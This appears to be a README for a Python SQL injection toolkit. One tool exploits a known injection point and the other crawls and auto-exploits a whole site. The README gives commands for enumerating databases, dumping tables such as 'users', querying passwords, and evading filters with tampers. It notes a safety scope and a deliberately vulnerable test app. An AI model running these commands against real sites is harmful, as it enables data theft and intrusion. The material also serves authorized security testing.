# pymap — SQL injection discovery & exploitation toolkit

Two command-line tools, one goal: **find SQL injection on a website and exploit it to extract data**.

- **`pymap.py`** — sqlmap-style exploit tool for a *known* injection point (single URL/param)
- **`pyscan.py`** — crawler + scanner + auto-exploiter for a *whole site*

```
    ____       __  ____
   / __ \___  / /_/ __ \___  _________  _____
  / /_/ / _ \/ __/ / / / _ \/ ___/ __ \/ ___/
 / ____/  __/ /_/ /_/ /  __/ /  / /_/ (__  )
/_/    \___/\__/_____/\___/_/   \____/____/
```

## Install

```bash
pip install requests
```

## pymap.py — exploit a known injection point

```bash
# detect + fingerprint (banner, current db, current user)
python3 pymap.py -u "http://target/page?id=1" --batch

# enumerate databases / tables / columns
python3 pymap.py -u "http://target/page?id=1" --dbs --exclude-sysdbs
python3 pymap.py -u "http://target/page?id=1" -D shopdb --tables
python3 pymap.py -u "http://target/page?id=1" -D shopdb -T users --columns

# dump a table (CSV + console table)
python3 pymap.py -u "http://target/page?id=1" -D shopdb -T users --dump

# arbitrary scalar query
python3 pymap.py -u "http://target/page?id=1" --sql-query "SELECT password FROM users LIMIT 1"

# POST body, cookies, tamper chains, PoC generator
python3 pymap.py -u "http://target/login" --data "user=a&pass=b" --technique=BT
python3 pymap.py -u "http://target/page?id=1" --level 2 --cookie "uid=1"
python3 pymap.py -u "http://target/page?id=1" --tamper=space2comment,randomcase --gen-poc
```

### Techniques

| Flag | Technique | How |
|------|-----------|-----|
| `E` | error-based | `EXTRACTVALUE` / `CAST`-error oracle, chunked for long values |
| `B` | boolean-blind | `AND (cond)` true/false response differential + per-char binary search |
| `T` | time-blind | `IF(cond,SLEEP(n),0)` (MySQL), `pg_sleep`, `WAITFOR DELAY`, SQLite heavy-CTE |
| `U` | UNION query | `ORDER BY` column count, echo-position discovery, marker extraction |

Default: `UEBT` (fastest first). Every detection uses positive + negative controls with majority voting; every extraction is cached in `pymap-output/<host>/state.json` so re-runs resume.

### Contexts & tampers

Contexts tried automatically: numeric, numeric+comment, single-quote, single-quote+comment, double-quote, LIKE-`%`.
Tampers: `space2comment`, `space2plus`, `space2tab`, `randomcase`, `between`, `charencode`, `equaltolike` (chainable: `--tamper=a,b,c`).

### DBMS support

MySQL/MariaDB, PostgreSQL, SQLite, MSSQL (core), Oracle (fingerprint).

## pyscan.py — find and exploit SQLi across a site

### Interactive mode (easiest)

Just run it with no arguments — type (or paste) any target URL and it gets scanned:

```bash
python3 pyscan.py
```

```
Enter target URL (or 'quit'): http://target/
Include time-based detection? slower (y/N):
Auto-exploit findings (fingerprint, db, user)? (Y/n):
Dump proof rows from vulnerable endpoints? (y/N):
...
[+] VULNERABLE: param 'id' via E
[*] exploiting...
[+] banner: 11.8.6-MariaDB-6 from Debian
[+] current database: shopdb

Enter target URL (or 'quit'):
```

Loops until you type `quit`. Every request is logged to `pyscan-output/evidence.jsonl`,
findings to `pyscan-output/report.json`. `http://` is added automatically if omitted.

### Command-line mode

```bash
# crawl + scan only (fast: UEB techniques)
python3 pyscan.py --url http://target/

# crawl + scan + exploit each finding (fingerprint, banner, db, user)
python3 pyscan.py --url http://target/ --exploit

# crawl + scan + dump proof rows from each vulnerable endpoint
python3 pyscan.py --url http://target/ --exploit --auto-dump

# scan a URL list, include time-based (slower)
python3 pyscan.py -l urls.txt --technique UEBT

# authed scanning
python3 pyscan.py --url http://target/ --cookie "session=abc" --exploit
```

Crawls same-host links, HTML forms (GET+POST) and `sitemap.xml`, dedupes by path+params, scans every parameter, then exploits what it finds. Report: `pyscan-output/report.json` + `evidence.jsonl` (every request logged).

## Test it locally (no external target needed)

```bash
# 1. start a local MariaDB (any instance works) and a deliberately vulnerable app
python3 vuln_app.py                      # needs PYMAP_DB_* env or edit defaults

# 2. run the tools against it
python3 pyscan.py --url http://127.0.0.1:5001/ --exploit
python3 pymap.py -u "http://127.0.0.1:5001/product?id=1" --dump-all
```

`vuln_app.py` exposes 7 injection flavors (numeric, string, LIKE, blind, time-only, POST, cookie).

## Output

```
pymap-output/<host>/
  session.json    # findings: param, technique, context, dbms, banner, stats
  state.json      # extraction cache (resumable)
  evidence.jsonl  # every request+response metadata
  <db>_<table>.csv
  poc.py          # standalone PoC (--gen-poc)
```

## Safety / scope discipline

- Only authorized targets. The tools are an instrument, not permission.
- Default dump limit: 10 rows/table (`--limit`) — proof, not pillage.
- `--delay` and `--crawl-delay` for politeness; time-based defaults to 5s sleeps.
- Extraction state is cached; use `--flush-session` for a clean run.

## Files

| File | Purpose |
|------|---------|
| `pymap.py` | exploit tool (detection → fingerprint → enumeration → dump → PoC) |
| `pyscan.py` | site crawler + scanner + auto-exploiter |
| `vuln_app.py` | deliberately vulnerable Flask app for safe testing |
| `tests/run_tests.sh` | end-to-end test script against vuln_app |
